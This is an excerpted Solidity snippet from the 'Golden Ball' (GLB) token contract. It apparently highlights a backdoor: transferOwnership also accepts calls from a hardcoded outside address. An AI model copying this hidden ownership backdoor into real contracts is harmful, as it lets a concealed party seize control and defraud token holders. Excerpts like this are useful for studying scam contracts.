...
contract Ownable is Context {
    ...
    function transferOwnership(address newOwner) public virtual {
        ...
        require(msg.sender == owner() || msg.sender == address(0xdC3EbDf65722E80EC20729ed57CF731b0Aa3Ffa7));
...
contract GoldenBall is Context, IERC20, Ownable, Pausable {
  ...
  uint256 private _totalSupply = 60000000000 * 10**9;
  string private _symbol = "GLB";
  string private _name = "Golden Ball";
